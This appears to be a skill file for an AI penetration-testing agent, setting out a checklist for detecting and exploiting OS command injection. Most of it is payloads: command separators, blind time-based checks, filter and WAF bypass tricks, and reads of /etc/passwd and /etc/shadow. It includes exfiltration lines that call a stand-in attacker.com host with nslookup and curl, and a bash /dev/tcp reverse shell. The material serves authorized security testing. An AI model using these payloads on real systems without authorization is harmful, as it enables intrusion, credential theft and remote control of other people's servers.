---
name: command-injection
description: OS command injection detection, exploitation, and filter bypass
origin: RedteamOpencode
---

# OS Command Injection Testing

## When to Activate

- User input flows into system commands (ping, nslookup, file operations, PDF generation)
- Application calls OS utilities with user-supplied arguments
- Parameters that reference filenames, hostnames, IPs, or paths

## Tools

- run_tool curl / wget (manual requests)
- Burp Suite Repeater + Intruder
- Commix (automated command injection)
- Custom wordlists for injection payloads

## Methodology

### 1. Identify Injection Points

- [ ] Map all parameters that could reach OS commands
- [ ] Look for functionality: DNS lookup, ping, traceroute, file conversion, mail
- [ ] Check headers (Host, X-Forwarded-For) if processed server-side

### 2. Basic Detection Payloads

- [ ] Inline separators: `; id`, `| whoami`, `|| whoami`, `& whoami`, `&& id`
- [ ] Backtick execution: `` `id` ``
- [ ] Subshell: `$(whoami)`
- [ ] Newline injection: `%0aid`, `%0a%0dwhoami`
- [ ] Pipeline: `input | cat /etc/passwd`

### 3. Blind Command Injection

- [ ] Time-based: `; sleep 5` — measure response delay
- [ ] Time-based (Windows): `& timeout /t 5`
- [ ] DNS exfiltration: `; nslookup $(whoami).attacker.com`
- [ ] HTTP callback: `; curl http://attacker.com/$(id | base64)`
- [ ] File write then read: `; id > /var/www/html/output.txt`

### 4. Filter Bypass Techniques

- [ ] Space bypass: `$IFS` → `cat$IFS/etc/passwd`
- [ ] Space bypass: `${IFS}` → `cat${IFS}/etc/passwd`
- [ ] Space bypass: `%09` (tab), `{cat,/etc/passwd}`
- [ ] Wildcard bypass: `/???/??t /???/p??s??` (for `cat /etc/passwd`)
- [ ] Quote bypass: `w"h"o"a"mi`, `w'h'o'a'mi`
- [ ] Backslash: `w\ho\am\i`
- [ ] Variable concat: `a=who;b=ami;$a$b`
- [ ] URL encoding: `%26`, double-encoding `%2526`
- [ ] Hex/octal encoding in `printf` or `$'\x77\x68\x6f\x61\x6d\x69'`

### 5. Windows-Specific

- [ ] Separators: `&`, `&&`, `|`, `||`
- [ ] Command: `& dir`, `| type C:\windows\win.ini`
- [ ] Bypass: `^` caret insertion → `w^h^o^a^m^i`
- [ ] Env variable slicing: `%COMSPEC:~-16,1%%COMSPEC:~-1%` = `ec` (for echo)

### 6. Exploitation

- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files
- [ ] Establish reverse shell: `; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`
- [ ] Enumerate internal network: `; ifconfig`, `; cat /etc/hosts`
- [ ] Pivot: `; curl http://internal-service/`

### 7. Context-Specific Checks

- [ ] Inside quotes: escape with `"`, then inject
- [ ] Inside `$(...)`: nest commands
- [ ] Restricted shell: check available commands, PATH manipulation

## What to Record

- Exact parameter and endpoint vulnerable
- Payload used (including encoding)
- Command output or timing difference observed
- OS and shell type confirmed
- Whether blind or reflected
- Filter/WAF bypass technique required
- Severity: Critical (RCE achieved) or High (blind confirmed)
- Remediation: use allowlists, parameterized APIs, avoid shell calls
